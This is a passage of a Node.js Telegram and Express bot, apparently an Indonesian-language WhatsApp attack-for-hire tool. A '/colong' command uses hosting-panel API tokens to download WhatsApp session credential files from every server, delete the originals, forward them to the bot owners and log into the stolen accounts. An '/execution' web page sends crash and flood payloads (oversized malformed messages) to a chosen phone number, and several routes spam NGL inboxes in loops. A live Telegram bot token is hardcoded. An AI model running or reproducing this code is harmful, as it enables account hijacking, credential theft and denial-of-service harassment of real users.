        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), reason }));

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect ${BotNumber}\nServer: ${name}\nReason: ${reason}`
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else await ctx.reply(`✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Owners sudah dikirimi file & percobaan connect dilakukan 1x)`);

  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA O DONO\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("colong", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /csession http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
╭━╮╭━╮╱╱╭━━━┳━━┳╮╱╱╭━━━╮╭━╮╱╭┳━━━━╮
╰╮╰╯╭╯╱╱┃╭━╮┣┫┣┫┃╱╱┃╭━━╯┃┃╰╮┃┃╭╮╭╮┃
╱╰╮╭╯╭━━┫╰━━╮┃┃┃┃╱╱┃╰━━╮┃╭╮╰╯┣╯┃┃╰╯
╱╭╯╰╮╰━━┻━━╮┃┃┃┃┃╱╭┫╭━━╯┃┃╰╮┃┃╱┃┃╱╱
╭╯╭╮╰╮╱╱┃╰━╯┣┫┣┫╰━╯┃╰━━╮┃┃╱┃┃┃╱┃┃╱╱
╰━╯╰━╯╱╱╰━━━┻━━┻━━━┻━━━╯╰╯╱╰━╯╱╰╯╱╱
`));

bot.launch();
console.log(chalk.red(`
╭─⦏ P O R O R O G E R A C A O 𝟏 ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : Shaasleep
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "PororoKiller", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "PororoKiller", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

      
const BOT_TOKEN = "8315139539:AAH97iiMuqYApbI2z_5QQ2jX0p38oqmfKoM";
const CHAT_ID = "7860329124";

// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.get("/execution", (req, res) => {
  try {
    console.log("📩 [EXECUTION] Request masuk:");
    console.log("IP:", req.headers['x-forwarded-for'] || req.connection.remoteAddress);
    console.log("User-Agent:", req.headers['user-agent']);
    console.log("Query:", req.query);
    console.log("Headers:", req.headers['accept']);

    const username = req.cookies.sessionUser;
    const filePath = "./X-SILENT/Login.html";

    fs.readFile(filePath, "utf8", (err, html) => {
      if (err) return res.status(500).send("✗ Gagal baca file Login.html");

      if (!username) return res.send(html);

      const users = getUsers();
      const currentUser = users.find(u => u.username === username);

      if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
        return res.send(html);
      }

      // 🔥 CEK COOLDOWN GLOBAL
      const now = Date.now();
      const cooldown = 0 * 0 * 0; // 5 menit
      if (now - lastExecution < cooldown) {
        const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
        return res.send(executionPage("⏳ SERVER COOLDOWN", {
          message: `Server sedang cooldown. Tunggu ${Math.ceil(sisa / 60)} menit lagi sebelum bisa eksekusi.`
        }, false, currentUser, "", ""));
      }

      const targetNumber = req.query.target;
      const mode = req.query.mode;
      const target = `${targetNumber}@s.whatsapp.net`;

      if (sessions.size === 0) {
        return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
          message: "Tunggu sampai maintenance selesai..."
        }, false, currentUser, "", mode));
      }

      if (!targetNumber) {
        if (!mode) {
          return res.send(executionPage("✓ Server ON", {
            message: "Pilih mode yang ingin digunakan."
          }, true, currentUser, "", ""));
        }

        if (["delay", "blank", "medium", "blank-ios"].includes(mode)) {
          return res.send(executionPage("✓ Server ON", {
            message: "Masukkan nomor target (62xxxxxxxxxx)."
          }, true, currentUser, "", mode));
        }

        return res.send(executionPage("✗ Mode salah", {
          message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
        }, false, currentUser, "", ""));
      }

      if (!/^\d+$/.test(targetNumber)) {
        return res.send(executionPage("✗ Format salah", {
          target: targetNumber,
          message: "Nomor harus hanya angka dan diawali dengan nomor negara"
        }, true, currentUser, "", mode));
      }

      try {
        if (mode === "delay") {
          GetSuZoXAndros(24, target);
        } else if (mode === "blank") {
          iosflood(24, target);
        } else if (mode === "medium") {
          blank(24, target);
        } else if (mode === "blank-ios") {
          blankios(24, target);
        } else if (mode === "fc") {
          fc(24, target);
        } else {
          throw new Error("Mode tidak dikenal.");
        }

        // ✅ update global cooldown
        lastExecution = now;

        // ✅ LOG LOKAL
        console.log(`[EXECUTION] User: ${username} | Target: ${targetNumber} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

        // ✅ KIRIM LOG KE TELEGRAM
        const logMessage = `⚡ *Execution Success*
👤 User: ${username}
🎯 Target: ${targetNumber}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}`;

        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: CHAT_ID,
          text: logMessage,
          parse_mode: "Markdown"
        }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

        return res.send(executionPage("✓ S U C C E S", {
          target: targetNumber,
          timestamp: new Date().toLocaleString("id-ID"),
          message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
        }, false, currentUser, "", mode));
      } catch (err) {
        return res.send(executionPage("✗ Gagal kirim", {
          target: targetNumber,
          message: err.message || "Terjadi kesalahan saat pengiriman."
        }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
      }
    });
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});
 
        

    

     
      

      
        

app.get("/send-ngl", async (req, res) => {
  const { link, message, amount } = req.query;
  if (!link || !message || !amount) {
    return res.json({ success: false, error: "Missing parameters" });
  }

  try {
    const username = link.includes("ngl.link/")
      ? link.split("ngl.link/")[1].replace("/", "")
      : null;
    if (!username)
      return res.json({ success: false, error: "Invalid NGL link" });

    let successCount = 0;

    for (let i = 0; i < Number(amount); i++) {
      const response = await fetch(`https://ngl.link/${username}`, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent":
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
          "origin": "https://ngl.link",
          "referer": `https://ngl.link/${username}`,
          "accept-language": "en-US,en;q=0.9",
        },
        body: new URLSearchParams({
          username,
          question: message,
          deviceId: crypto.randomUUID(),
          gameSlug: "confession",
          referrer: "https://instagram.com/",
        }),
      });

      const text = await response.text();

      // ✅ deteksi berhasil kirim
      if (text.includes("Thanks for your message!") || response.ok) {
        successCount++;
      }

      await new Promise(r => setTimeout(r, 1200)); // delay 1.2 detik biar aman
    }

    res.json({ success: true, sent: successCount });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.get("/sejhhyjngl", async (req, res) => {
  const { link, message, amount } = req.query;
  if (!link || !message || !amount)
    return res.json({ success: false, error: "Missing parameters" });

  try {
    const username = link.includes("ngl.link/")
      ? link.split("ngl.link/")[1].replace("/", "")
      : null;
    if (!username)
      return res.json({ success: false, error: "Invalid NGL link" });

    let successCount = 0;
    for (let i = 0; i < Number(amount); i++) {
      const response = await fetch(`https://ngl.link/${username}`, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": "Mozilla/5.0"
        },
        body: new URLSearchParams({
          username,
          question: message,
          deviceId: Math.random().toString(36).substring(2, 15),
          gameSlug: "",
          referrer: ""
        })
      });

      if (response.ok) successCount++;
      await new Promise(r => setTimeout(r, 1000));
    }

    return res.json({ success: true, sent: successCount });
  } catch (err) {
    return res.json({ success: false, error: err.message });
  }
});

// ✅ Route NGL tetap di bawah inisialisasi app, tapi di luar bot handler
app.get("/n", async (req, res) => {
  const { link, message, amount } = req.query;
  if (!link || !message || !amount) {
    return res.json({ success: false, error: "Missing parameters" });
  }

  try {
    const username = link.includes("ngl.link/")
      ? link.split("ngl.link/")[1].replace("/", "")
      : null;
    if (!username)
      return res.json({ success: false, error: "Invalid NGL link" });

    let successCount = 0;
    for (let i = 0; i < Number(amount); i++) {
      const response = await fetch(`https://ngl.link/${username}`, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        },
        body: new URLSearchParams({
          username,
          question: message,
          deviceId: Math.random().toString(36).substring(2, 15),
          gameSlug: "",
          referrer: ""
        })
      });

      if (response.ok) successCount++;
      await new Promise(r => setTimeout(r, 1000)); // Delay 1 detik
    }

    res.json({ success: true, sent: successCount });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

app.get("/sl", async (req, res) => {
  const { link, message, amount } = req.query;

  if (!link || !message || !amount) {
    return res.json({ success: false, error: "Missing parameters" });
  }

  try {
    // Ambil username dari link NGL
    const username = link.split("ngl.link/")[1]
      ? link.split("ngl.link/")[1].replace("/", "")
      : null;

    if (!username) {
      return res.json({ success: false, error: "Invalid NGL link" });
    }

    let successCount = 0;

    // Loop kirim pesan ke NGL
    for (let i = 0; i < Number(amount); i++) {
      const response = await fetch(`https://ngl.link/${username}`, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        },
        body: new URLSearchParams({
          username: username,
          question: message,
          deviceId: Math.random().toString(36).substring(2, 15),
          gameSlug: "",
          referrer: ""
        })
      });

      if (response.ok) successCount++;

      // Delay 1 detik biar gak ke-block
      await new Promise(r => setTimeout(r, 1000));
    }

    res.json({ success: true, sent: successCount });

  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});
      
        

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== PORORO FUNCTIONS ==================== //
async function BetaDelay(sock, X) {
    let MemekPink = await generateWAMessageFromContent(
        X,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - are you listening? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let MemekPink2 = await generateWAMessageFromContent(
        X,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - who are you ? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: MemekPink.key.id,
            statusJidList: [X],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: X },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: MemekPink2.key.id,
            statusJidList: [X],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: X },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function XStromUiCrash(X) {
  const msg1 = generateWAMessageFromContent(X, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [X],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
              extendedTextMessage: {
            text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
            contextInfo: {
              stanzaId: X,
              participant: X,
              quotedMessage: {
                conversation:
                  "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
              },
            },
          },
        },
      },
    },
  }, {});
  
  const msg2 = await generateWAMessageFromContent(
    X,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "XProtex" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
                },
              },
              externalAdReply: {
                title: "ꦾ࣯࣯".repeat(50000),
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://XProtex-ai.example.com",
                showAdAttribution: false
              },
            },
            body: { 
              text: "⌁⃰𝙓𝙎𝙩𝙧𝙤𝙢𝙁𝙡𝙤𝙬𝙚𝙧ཀ" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
   );
   
  //RELAY MESSAGE 1
  await sock.relayMessage(X, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: X },
  });
  //RELAY MESSAGE 2
  await sock.relayMessage(X, msg2.message, {
     participant: { jid: X },
     messageId: msg2.key.id,
   });
   console.log(chalk.red(`Succes Sending Bug CrashUi To ${X}`));
}



async function BadzzDelay(sock, X) {
  try {
    let delay1 = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "call_permission_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    let delay2 = {
      extendedTextMessage: {
        text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "ꦾ".repeat(299986),
        contextInfo: {
          participant: X,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const delay001 = generateWAMessageFromContent(X, delay2, {});
    await sock.relayMessage("status@broadcast", delay001.message, {
      messageId: delay001.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: X }, content: undefined }
          ]
        }]
      }]
    });

    await sock.relayMessage("status@broadcast", delay1.message, {
      messageId: delay1.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: X }, content: undefined }
          ]
        }]
      }]
    });

  } catch (error) {
    console.error("Error di :", error, "Fix Sendiri Lu Kan Dev🤓");
  }
}



async function forceClose(X) {
  try {
    const dandelion = 'ោ៝'.repeat(20000);
    const jawa = 'ꦾ'.repeat(15000);

    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1234567891234@newsletter",
        newsletterName: "FC_Dandelion" + dandelion,
        caption: "forceclose_" + jawa,
        inviteExpiration: Date.now() + 999999,
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: [
            "0@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
            X
          ],
        },
      },
    };

    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: "FC_" + Date.now(),
    });

    console.log(chalk.green.bold(`✅ Force Close Payload terkirim ke ${X}`));
  } catch (err) {
    console.error(chalk.red("❌ Gagal Kirim Force Close =>"), err);
  }
}

/*
Credit : @VallOffcial

EFECK BUGS
- FORCLOSE ON MSG
- TEMBUS BUSINES
- NON INVISIBLE
- NOT WORK ALL VERSION YA BOCIL
NOTE : NOT SHARE TO PARTNER, OWNER, TANGAN KANAN LU!! KETAHUAN BL NO C3
*/

async function stickerValltzy(sock, X) {
  try {
    const message = {
      stickerPackMessage: {
        stickerPackId: "72de8e77-5320-4c69-8eba-ea2d274c5f12",
        name: "Mau Di Rodok Vall??".repeat(1000),
        publisher: "ꦾ".repeat(10000),
        stickers: [
          {
            fileName: "r6ET0PxYVH+tMk4DOBH2MQYzbTiMFL5tMkMHDWyDOBs=.webp",
            isAnimated: true,
            accessibilityLabel: "yandex",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "99999999",
        fileSha256: "+tCLIfRSesicXnxE6YwzaAdjoP0BBfcLsDfCE0fFRls=",
        fileEncSha256: "PJ4lASN6j8g+gRxUEbiS3EahpLhw5CHREJoRQ1h9UKQ=",
        mediaKey: "kX3W6i35rQuRmOtVi6TARgbAm26VxyCszn5FZNRWroA=",
        directPath: "/v/t62.15575-24/29608676_1861690974374158_673292075744536110_n.enc",
        mediaKeyTimestamp: "1740922864",
        trayIconFileName: "72de8e77-5320-4c69-8eba-ea2d274c5f12.png",
        thumbnailDirectPath: "/v/t62.15575-24/35367658_2063226594091338_6819474368058812341_n.enc",
        thumbnailSha256: "SxHLg3uT9EgRH2wLlqcwZ8M6WCgCfwZuelX44J/Cb/M=",
        thumbnailEncSha256: "EMFLq0BolDqoRLkjRs9kIrF8yRiO+4kNl4PazUKc8gk=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "MjEyOGU2ZWM3NWFjZWRiYjNiNjczMzFiZGRhZjBlYmM1MDI3YTM0ZWFjNTRlMTg4ZjRlZjRlMWRjZGVmYTc1Zg==",
        stickerPackSize: "9999999999",
        stickerPackOrigin: "USER_CREATED"
      },
      interactiveMessage: {
        contextInfo: {
         mentionedJid: [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
           ],
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: X
          }
        },
        body: {
          text: "Vall Is Here"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: ""
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
            }
          ],
          messageParamsJson: "{}"
        }
      }
    };

    const msg = {
      key: {
        remoteJid: X,
        fromMe: true,
        id: `BAE5${Math.floor(Math.random() * 1000000)}`
      },
      message: message
    };

    await sock.relayMessage(X, message, { 
    messageId: msg.key.id 
    });
    
    console.log(`Fc striker VallOffcial Sending to ${X}!`);
  } catch (error) {
    console.error("Error sending bug Fc sticker pack:", error);
  }
}

async function mampus(X, mention) {
  const msgg = await generateWAMessageFromContent(X, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "DelayBy".repeat(50000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: X },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random () *50000000) + "@s.whatsapp.net",
            ),
          ],
        },
      },
    },
  }, {});

  const message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
